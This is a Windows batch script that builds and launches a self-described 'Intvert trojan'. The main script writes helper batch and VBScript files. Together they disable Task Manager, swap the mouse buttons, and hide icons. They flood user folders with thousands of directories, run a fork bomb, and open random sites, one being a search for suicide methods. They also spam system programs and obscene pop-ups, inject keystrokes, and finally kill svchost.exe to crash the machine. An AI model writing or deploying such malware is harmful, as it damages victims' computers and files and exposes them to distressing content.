@echo off
timeout /t 2 /nobreak
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    goto :beens
) ELSE (
	cls
	echo ---------------------------------------------
	echo OI MATE START THIS BITCH IN FUKIN ADMIN MODE
	echo ---------------------------------------------
	echo.
	pause >nul
	exit
)
:beens
::Reseting the hosts file 
del %userprofile%\Intvert /F /S /Q 
cd %userprofile%
md Intvert
cd %userprofile%\Intvert
::Creating a dir for all the "payloads" to be stored in
set noea=0
echo %~dp0 > tmpf 
set /p curntDir= < tmpf 
del tmpf
xcopy %curntDir%\Divide.mp3 %Userprofile%\Intvert /y
xcopy %curntDir%\Christ.mp3 %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\Christ.mp3 %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\Divide.mp3 %Userprofile%\Intvert /y
cd %userprofile%\desktop
( echo @echo off
  echo echo RUN AS ADMIN OR THE SCRIPT TO FIX WONT WORK
  echo pause
  echo del %userprofile%\Intvert /F /S /Q 
  echo REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 0 /f
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D 0 /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D 0 /F) >RESTORE-PC-SRLY.bat
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
cd %Userprofile%\Intvert
::--------------------BAT---------------------------
( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\downloads\*.* %%userprofile%%\documents /C /Y
  set /a dris="%%userprofile%%\documents"
  echo :noRest
  echo set drs=0
  echo :daws
  echo set lo=0
  echo cd %%dris%%
  echo :noea
  echo md YouAreAnIdiot%%random%%%%random%%%%random%%%%random%%%%random%%
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==4096 goto nea
  echo goto noea
  echo :nea
  echo set /a drs=%%drs%%+1
  echo set lo=0
  echo if %%drs%% ==1 set /a dris="%%userprofile%%\desktop"
  echo if %%drs%% ==2 set /a dris="%%userprofile%%\music"
  echo if %%drs%% ==3 set /a dris="%%userprofile%%\photos"
  echo if %%drs%% ==4 set /a dris="%%userprofile%%\downloads"
  echo if %%drs%% ==5 set /a dris="%%userprofile%%\documents"
  echo if %%drs%% ==6 goto noRest
  echo goto daws) > mdhole.bat
( echo %%0% %^|% %%%0%) > bomb.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%4
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd %%userprofile%%\Intvert
  echo start M%%Rand%%.vbs
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
  echo start C:\WINDOWS\system32\Magnify.exe
  echo timeout /t 3
  echo goto check) > a.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%46
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo if %%Rand%%==0 start http://google.co.ck/search?q=Gime+money
  echo if %%Rand%%==1 start https://youtu.be/FiARsQSlzDc
  echo if %%Rand%%==2 start https://youtu.be/UI1KY4kPpok?t=32
  echo if %%Rand%%==3 start https://youtu.be/7PYe57MwxPI?t=42
  echo if %%Rand%%==4 start https://youtu.be/UJZuupCv3dU
  echo if %%Rand%%==5 start https://www.youtube.com/watch?v=7xFe0vkUJXU
  echo if %%Rand%%==6 start https://www.youtube.com/watch?v=t_LJtG2gXSc
  echo if %%Rand%%==7 start https://www.youtube.com/watch?v=aRsOBFhNjVM	
  echo if %%Rand%%==8 start https://www.reddit.com/r/cursedimages/
  echo if %%Rand%%==9 start https://www.ibm.com/support/knowledgecenter/en/SSGMCP_4.2.0/com.ibm.cics.ts.messages.doc/cics_mc/ASxx_abend_codes/ASRD.html
  echo if %%Rand%%==10 start https://www.aviationweather.gov/adds/
  echo if %%Rand%%==11 start https://www.desertorder.com/
  echo if %%Rand%%==12 start https://www.mchacks.net/
  echo if %%Rand%%==13 start http://google.co.ck/search?q=best+way+to+kill+yourself
  echo if %%Rand%%==14 start http://google.co.ck/search?q=how+2+remove+a+virus
  echo if %%Rand%%==15 start http://google.co.ck/search?q=mcafee+vs+norton
  echo if %%Rand%%==16 start http://google.co.ck/search?q=minecraft+hax+download+no+virus
  echo if %%Rand%%==17 start http://google.co.ck/search?q=how+to+get+money
  echo if %%Rand%%==18 start http://google.co.ck/search?q=bonzi+buddy+download+free
  echo if %%Rand%%==19 start http://google.co.ck/search?q=what+happens+if+you+delete+system32
  echo if %%Rand%%==20 start http://google.co.ck/search?q=g3t+r3k
  echo if %%Rand%%==21 start http://google.co.ck/search?q=virus.exe
  echo if %%Rand%%==22 start http://google.co.ck/search?q=internet+explorer+is+the+best+browser
  echo if %%Rand%%==23 start http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp
  echo if %%Rand%%==24 start http://google.co.ck/search?q=dank+memz
  echo if %%Rand%%==25 start http://google.co.ck/search?q=how+to+download+memz
  echo if %%Rand%%==26 start http://google.co.ck/search?q=half+life+3+release+date
  echo if %%Rand%%==27 start http://google.co.ck/search?q=is+illuminati+real
  echo if %%Rand%%==28 start http://google.co.ck/search?q=the+memz+are+real
  echo if %%Rand%%==29 start http://google.co.ck/search?q=stanky+danky+maymays
  echo if %%Rand%%==30 start http://google.co.ck/search?q=john+cena+midi+legit+not+converted
  echo if %%Rand%%==31 start http://google.co.ck/search?q=vinesauce+meme+collection
  echo if %%Rand%%==32 start http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi
  echo if %%Rand%%==33 start http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45
  echo if %%Rand%%==34 start http://play.clubpenguin.com
  echo if %%Rand%%==35 start http://pcoptimizerpro.com
  echo if %%Rand%%==36 start http://softonic.com
  echo if %%Rand%%==37 start https://www.google.com/search?q=www.google.co.ck
  echo if %%Rand%%==38 start http://www.penisland.net/
  echo if %%Rand%%==39 start https://giphy.com/embed/l46Cbqvg6gxGvh2PS
  echo if %%Rand%%==40 start https://www.addictivetips.com/
  echo if %%Rand%%==41 start https://www.lifehacker.com.au/?r=US
  echo if %%Rand%%==42 start https://www.snopes.com/
  echo if %%Rand%%==43 start https://en.softonic.com/articles/fix-slow-computer
  echo if %%Rand%%==44 start https://360-total-security.en.softonic.com/support
  echo if %%Rand%%==45 start https://advanced-systemcare-ultimate.en.softonic.com/
  echo timeout /t 7
  echo goto check) > b.bat
( echo @echo off
  echo cd %userprofile%\Intvert
  echo curl -o "haxr.jpg" https://image.freepik.com/free-vector/protection-against-hacker_106788-323.jpg
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\haxr.jpg /f
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
  echo set lo=0
  echo :noea
  echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==64 goto nea
  echo goto noea
  echo :nea
  echo exit) > g.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%20
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd C:\WINDOWS\system32
  echo if %%Rand%%==0 start C:\Windows\write.exe
  echo if %%Rand%%==1 start dfgui.exe
  echo if %%Rand%%==2 start SnippingTool.exe
  echo if %%Rand%%==3 start SndVol.exe
  echo if %%Rand%%==4 start osk.exe
  echo if %%Rand%%==5 start notepad.exe
  echo if %%Rand%%==6 start Narrator.exe
  echo if %%Rand%%==7 start mspaint.exe
  echo if %%Rand%%==8 start msinfo32.exe
  echo if %%Rand%%==9 start msconfig.exe
  echo if %%Rand%%==10 start colorcpl.exe
  echo if %%Rand%%==11 start calc.exe
  echo if %%Rand%%==12 start charmap.exe
  echo if %%Rand%%==13 start C:\Windows\Resources\Themes\aero\aero.msstyles
  echo if %%Rand%%==14 start SystemPropertiesAdvanced.exe
  echo if %%Rand%%==15 start SystemPropertiesComputerName.exe
  echo if %%Rand%%==16 start SystemPropertiesHardware
  echo if %%Rand%%==17 start SystemPropertiesPerformance
  echo if %%Rand%%==18 start SystemPropertiesProtection
  echo if %%Rand%%==19 start SystemPropertiesRemote
  echo taskkill /F /IM SystemPropertiesAdvanced.exe
  echo taskkill /F /IM SystemPropertiesComputerName.exe
  echo taskkill /F /IM SystemPropertiesHardware
  echo taskkill /F /IM SystemPropertiesPerformance
  echo taskkill /F /IM SystemPropertiesProtection
  echo taskkill /F /IM SystemPropertiesRemote
  echo timeout /t 6
  echo goto check) > e.bat
( echo @echo off
  echo :asd
  echo set /a a=%%random%% %%%%1
  echo set /a b=%%random%% %%%%1
  echo set /a c=%%random%% %%%%1
  echo set /a d=%%random%% %%%%1
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D 1 /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D 1 /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
  echo timeout /t 4
  echo goto check) > f.bat
( echo @echo off
  echo cd C:\WINDOWS\system32
  echo :a
  echo start Magnify.exe
  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
  echo timeout /t 1
  echo start Magnify.exe
  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
  echo timeout /t 1
  echo goto a) >c.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%Random%% %%%%400
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
  echo timeout /t 3) > d.bat
::--------------------VBS---------------------------
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "Divide.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >trk.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "Christ.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >ChristM.vbs
( echo x=msgbox("Get that shit loaded",48,"In YA"^)) >M1.vbs
( echo x=msgbox("Still using this computer^?",48,"No Shit"^)) >M2.vbs
( echo x=msgbox("Lemon mixed with milk",48,"Vinesause^?"^)) >M3.vbs
( echo x=msgbox("Cum Slut",48,"U know u are"^)) >M0.vbs
::-----------------------------------------------------------------------------
( echo do
  echo x=msgbox("It's Christmas, Go Outside",48,"FUCK OFF MATE"^)
  echo loop) >christmas.vbs
::-----------------------------------------------------------------------------
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\a.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S1.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\b.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S2.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\c.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S3.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\d.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S4.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\e.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S5.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\f.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S6.vbs
  ( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\g.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S7.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\Bomb.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S8.vbs
  
( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
  echo do
  echo wscript.sleep 100
  echo wshshell.sendkeys "{H}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{T}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{M}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{E}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{G}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{N}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{!}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo loop) >kes.vbs
( echo do
  echo Set WshShell = CreateObject("WScript.Shell"^)
  echo wscript.sleep 10
  echo WshShell.SendKeys(chr(^&hAF^)^)
  echo loop) >v.vbs
::--------------------TXT---------------------------
( echo Fist off thanks for running this script
  echo Seccondly your computer has been infected by the Intvert tojan
  echo Have fun trying to use your computer, it won't last long
  echo.
  echo Shutting down has a chance of harming yous system so I don't 
  echo reccomend it, just wait till the drop. Enjoy :D) >Yes.txt
rundll32.exe %SystemRoot%\system32\shell32.dll,Control_RunDLL %SystemRoot%\system32\desk.cpl desk,@Themes /Action:OpenTheme /file:"C:\Windows\Resources\Themes\aero.theme"
taskkill /f /im SystemSettings.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
taskkill /f /im explorer.exe
start explorer.exe
Rundll32 user32,SwapMouseButton
start s7.vbs
start trk.vbs
start Yes.txt
timeout /t 28 /nobreak
start S2.vbs
start S6.vbs
start kes.vbs
timeout /t 36 /nobreak
start v.vbs
start S3.vbs
timeout /t 36 /nobreak
start S1.vbs
start S4.vbs
timeout /t 36 /nobreak
start S5.vbs 
timeout /t 36 /nobreak
taskkill /F /IM wscript.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
taskkill /f /im explorer.exe
start explorer.exe
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
( echo.
  echo So your computer has been trashed by the Intvert tojan
  echo.
  echo You haven't rebooted which im only guessing means you want
  echo To see more payloads, or your scared and don't know what
  echo to do, most people by now would've restarted but thats not you
  echo This trojen isn't harmfull its made to scare, this "trojen"
  echo changes some reg keys and because of this a .bat has been made
  echo on the desktop to re-enable taskmgr and reset magnifier.
  echo.
  echo Since your still here we might aswell give you a show
  echo If this system is "low-end" its going to crash, if not
  echo Enjoy :D) >GiveItASec.txt
TASKKILL /F /IM explorer.exe
start /max GiveItASec.txt
timeout /t 32 /nobreak
start explorer.exe
start S2.vbs
timeout /t 16 /nobreak 
::SLOW THIS SHIT DOWN
start S8.vbs
timeout /t 16 /nobreak
::LETS FINNISH THIS SHIT
taskkill /F /Im svchost.exe